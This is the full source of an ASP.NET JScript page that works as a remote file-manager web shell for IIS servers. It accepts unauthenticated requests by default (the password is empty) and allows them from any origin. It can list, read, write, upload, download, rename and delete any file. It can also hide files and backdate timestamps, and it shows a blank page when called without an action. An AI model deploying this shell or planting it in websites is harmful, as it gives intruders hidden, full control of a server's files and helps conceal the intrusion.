<%@ Page Language="JScript" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections" %>
<%
Response.ContentType = "application/json";
Response.Charset = "utf-8";
Response.AddHeader("Access-Control-Allow-Origin", "*");
Response.AddHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
Response.AddHeader("Access-Control-Allow-Headers", "Content-Type");

if (Request.HttpMethod == "OPTIONS") { Response.End(); }

var PASSWORD = "";
var password = Request.QueryString["password"] || Request.Form["password"] || "";
var action = Request.QueryString["action"] || Request.Form["action"] || "";

if (PASSWORD != "" && password != PASSWORD) { Response.Write("null"); Response.End(); }
if (action == "") { Response.ContentType = "text/html"; Response.End(); }

function getParam(name) {
    var v = Request.QueryString[name];
    if (v == null || v == "") v = Request.Form[name];
    return v || "";
}

function escStr(s) {
    if (s == null) return "";
    return String(s).replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n").replace(/\r/g, "\\r").replace(/\t/g, "\\t");
}

function toJson(obj) {
    if (obj == null) return "null";
    var t = obj.GetType().Name;
    if (t == "Boolean") return obj ? "true" : "false";
    if (t == "Int32" || t == "Int64" || t == "Double" || t == "Single" || t == "Decimal") return obj.ToString();
    if (t == "String") return '"' + escStr(obj) + '"';
    if (t == "Hashtable") {
        var ht = obj;
        var parts = new ArrayList();
        var en = ht.Keys.GetEnumerator();
        while (en.MoveNext()) {
            var k = en.Current;
            parts.Add('"' + escStr(k) + '":' + toJson(ht[k]));
        }
        return "{" + join(parts, ",") + "}";
    }
    if (t == "ArrayList") {
        var arr = obj;
        var items = new ArrayList();
        for (var i = 0; i < arr.Count; i++) {
            items.Add(toJson(arr[i]));
        }
        return "[" + join(items, ",") + "]";
    }
    return '"' + escStr(obj.ToString()) + '"';
}

function join(arr, sep) {
    var result = "";
    for (var i = 0; i < arr.Count; i++) {
        if (i > 0) result += sep;
        result += arr[i];
    }
    return result;
}

function ok(data) {
    var r = new Hashtable();
    r["success"] = true;
    r["data"] = data;
    r["message"] = "";
    return r;
}

function okMsg(msg) {
    var r = new Hashtable();
    r["success"] = true;
    r["message"] = msg;
    return r;
}

function fail(msg) {
    var r = new Hashtable();
    r["success"] = false;
    r["message"] = msg;
    return r;
}

function formatSize(size) {
    if (size < 1024) return size + " B";
    if (size < 1048576) return (size / 1024).toFixed(1) + " KB";
    if (size < 1073741824) return (size / 1048576).toFixed(1) + " MB";
    return (size / 1073741824).toFixed(1) + " GB";
}

function toUnixTime(dt) {
    var epoch = new Date(1970, 0, 1, 0, 0, 0);
    return Math.floor((dt.getTime() - epoch.getTime()) / 1000);
}

function normPath(p) {
    if (p == null || p == "" || p == "/") return Server.MapPath("/");
    return p.replace(/\//g, "\\");
}

function getPerms(attr, isDir) {
    var p = isDir ? "d" : "-";
    p += "r"; p += (attr & 1) ? "-" : "w"; p += isDir ? "x" : "-";
    p += "r-"; p += isDir ? "x" : "-"; p += "r-"; p += isDir ? "x" : "-";
    return p;
}

function makeItem(name, path, isDir, size, mtime, perms, writable) {
    var item = new Hashtable();
    item["name"] = name;
    item["path"] = path;
    item["is_dir"] = isDir;
    item["size"] = isDir ? 0 : size;
    item["size_formatted"] = isDir ? "-" : formatSize(size);
    item["mtime"] = mtime;
    item["perms"] = perms;
    item["readable"] = true;
    item["writable"] = writable;
    return item;
}

try {
    if (action == "list") {
        var listPath = normPath(getParam("path"));
        var dir = new DirectoryInfo(listPath);
        if (dir.Exists) {
            var items = new ArrayList();
            if (dir.Parent != null) {
                items.Add(makeItem("..", dir.Parent.FullName, true, 0, 0, "drwxr-xr-x", true));
            }
            var dirs = dir.GetDirectories();
            for (var i = 0; i < dirs.Length; i++) {
                try {
                    var d = dirs[i];
                    items.Add(makeItem(d.Name, d.FullName, true, 0, toUnixTime(d.LastWriteTime), getPerms(int(d.Attributes), true), (int(d.Attributes) & 1) == 0));
                } catch (ex) {}
            }
            var files = dir.GetFiles();
            for (var j = 0; j < files.Length; j++) {
                try {
                    var f = files[j];
                    items.Add(makeItem(f.Name, f.FullName, false, int(f.Length), toUnixTime(f.LastWriteTime), getPerms(int(f.Attributes), false), !f.IsReadOnly));
                } catch (ex) {}
            }
            var data = new Hashtable();
            data["path"] = listPath;
            data["items"] = items;
            Response.Write(toJson(ok(data)));
        } else {
            Response.Write(toJson(fail("Directory not found")));
        }
    }
    else if (action == "read") {
        var readPath = normPath(getParam("path"));
        if (File.Exists(readPath)) {
            var content = File.ReadAllText(readPath, System.Text.Encoding.UTF8);
            var data = new Hashtable();
            data["path"] = readPath;
            data["content"] = content;
            Response.Write(toJson(ok(data)));
        } else {
            Response.Write(toJson(fail("File not found")));
        }
    }
    else if (action == "write") {
        var writePath = getParam("path");
        var writeContent = Request.Form["content"] || "";
        if (writePath != "") {
            var parentDir = Path.GetDirectoryName(writePath);
            if (parentDir != "" && !Directory.Exists(parentDir)) {
                Response.Write(toJson(fail("Parent directory doesn't exist")));
            } else {
                File.WriteAllText(writePath, writeContent, System.Text.Encoding.UTF8);
                Response.Write(toJson(okMsg("Saved to " + writePath)));
            }
        } else {
            Response.Write(toJson(fail("Path empty")));
        }
    }
    else if (action == "mkdir") {
        var mkdirPath = getParam("path");
        if (mkdirPath != "") {
            if (!Directory.Exists(mkdirPath)) {
                Directory.CreateDirectory(mkdirPath);
                Response.Write(toJson(okMsg("Created")));
            } else {
                Response.Write(toJson(fail("Already exists")));
            }
        } else {
            Response.Write(toJson(fail("Path empty")));
        }
    }
    else if (action == "delete") {
        var deletePath = normPath(getParam("path"));
        if (Directory.Exists(deletePath)) {
            Directory.Delete(deletePath, true);
            Response.Write(toJson(okMsg("Deleted")));
        } else if (File.Exists(deletePath)) {
            File.Delete(deletePath);
            Response.Write(toJson(okMsg("Deleted")));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else if (action == "rename") {
        var oldPath = normPath(getParam("old_path"));
        var newPath = getParam("new_path");
        if (Directory.Exists(oldPath)) {
            Directory.Move(oldPath, newPath);
            Response.Write(toJson(okMsg("Renamed")));
        } else if (File.Exists(oldPath)) {
            File.Move(oldPath, newPath);
            Response.Write(toJson(okMsg("Renamed")));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else if (action == "download") {
        var downloadPath = normPath(getParam("path"));
        if (File.Exists(downloadPath)) {
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(downloadPath) + "\"");
            Response.TransmitFile(downloadPath);
            Response.End();
        } else {
            Response.Write(toJson(fail("File not found")));
        }
    }
    else if (action == "upload") {
        var uploadDir = getParam("dir");
        if (uploadDir == "") uploadDir = Server.MapPath("/");
        uploadDir = normPath(uploadDir);
        if (Request.Files.Count > 0) {
            var uploadFile = Request.Files[0];
            var uploadFilePath = Path.Combine(uploadDir, Path.GetFileName(uploadFile.FileName));
            uploadFile.SaveAs(uploadFilePath);
            var data = new Hashtable();
            data["path"] = uploadFilePath;
            Response.Write(toJson(ok(data)));
        } else {
            Response.Write(toJson(fail("No file")));
        }
    }
    else if (action == "touch") {
        var touchPath = normPath(getParam("path"));
        var timestamp = 0;
        try { timestamp = parseInt(getParam("time")); } catch (e) {}
        if ((File.Exists(touchPath) || Directory.Exists(touchPath)) && timestamp > 0) {
            var newTime = new Date(1970, 0, 1);
            newTime.setSeconds(timestamp);
            if (File.Exists(touchPath)) {
                File.SetLastWriteTime(touchPath, newTime);
            } else {
                Directory.SetLastWriteTime(touchPath, newTime);
            }
            Response.Write(toJson(okMsg("Updated")));
        } else {
            Response.Write(toJson(fail("Not found or invalid time")));
        }
    }
    else if (action == "chmod") {
        var chmodPath = normPath(getParam("path"));
        var mode = getParam("mode");
        if ((File.Exists(chmodPath) || Directory.Exists(chmodPath)) && mode != "") {
            if (File.Exists(chmodPath)) {
                var fi = new FileInfo(chmodPath);
                if (mode == "readonly") fi.Attributes = fi.Attributes | FileAttributes.ReadOnly;
                else if (mode == "normal") fi.Attributes = fi.Attributes & ~FileAttributes.ReadOnly;
                else if (mode == "hidden") fi.Attributes = fi.Attributes | FileAttributes.Hidden;
                else if (mode == "visible") fi.Attributes = fi.Attributes & ~FileAttributes.Hidden;
            } else {
                var di = new DirectoryInfo(chmodPath);
                if (mode == "readonly") di.Attributes = di.Attributes | FileAttributes.ReadOnly;
                else if (mode == "normal") di.Attributes = di.Attributes & ~FileAttributes.ReadOnly;
                else if (mode == "hidden") di.Attributes = di.Attributes | FileAttributes.Hidden;
                else if (mode == "visible") di.Attributes = di.Attributes & ~FileAttributes.Hidden;
            }
            Response.Write(toJson(okMsg("Permission changed")));
        } else {
            Response.Write(toJson(fail("Not found or mode empty")));
        }
    }
    else if (action == "server") {
        var docRoot = Server.MapPath("/");
        var diskFree = "N/A";
        var diskTotal = "N/A";
        try {
            var drive = new DriveInfo(Path.GetPathRoot(docRoot));
            diskFree = formatSize(drive.AvailableFreeSpace);
            diskTotal = formatSize(drive.TotalSize);
        } catch (ex) {}
        var data = new Hashtable();
        data["php_version"] = "JScript .NET " + System.Environment.Version.ToString();
        data["server_software"] = Request.ServerVariables["SERVER_SOFTWARE"] || "IIS";
        data["document_root"] = docRoot;
        data["upload_max"] = "N/A";
        data["disk_free"] = diskFree;
        data["disk_total"] = diskTotal;
        data["current_user"] = System.Environment.UserName || "N/A";
        Response.Write(toJson(ok(data)));
    }
    else if (action == "info") {
        var infoPath = normPath(getParam("path"));
        if (File.Exists(infoPath)) {
            var fi = new FileInfo(infoPath);
            var data = new Hashtable();
            data["path"] = infoPath;
            data["name"] = fi.Name;
            data["is_dir"] = false;
            data["size"] = int(fi.Length);
            data["size_formatted"] = formatSize(fi.Length);
            data["mtime"] = toUnixTime(fi.LastWriteTime);
            data["ctime"] = toUnixTime(fi.CreationTime);
            data["atime"] = toUnixTime(fi.LastAccessTime);
            data["perms"] = getPerms(int(fi.Attributes), false);
            data["perms_octal"] = "0644";
            data["owner"] = "N/A";
            data["group"] = "N/A";
            data["readable"] = true;
            data["writable"] = !fi.IsReadOnly;
            Response.Write(toJson(ok(data)));
        } else if (Directory.Exists(infoPath)) {
            var di = new DirectoryInfo(infoPath);
            var data = new Hashtable();
            data["path"] = infoPath;
            data["name"] = di.Name;
            data["is_dir"] = true;
            data["size"] = 0;
            data["size_formatted"] = "-";
            data["mtime"] = toUnixTime(di.LastWriteTime);
            data["ctime"] = toUnixTime(di.CreationTime);
            data["atime"] = toUnixTime(di.LastAccessTime);
            data["perms"] = getPerms(int(di.Attributes), true);
            data["perms_octal"] = "0755";
            data["owner"] = "N/A";
            data["group"] = "N/A";
            data["readable"] = true;
            data["writable"] = (int(di.Attributes) & 1) == 0;
            Response.Write(toJson(ok(data)));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else {
        Response.Write(toJson(fail("Unknown action")));
    }
} catch (e) {
    Response.Write(toJson(fail("Error: " + e.message)));
}
%>
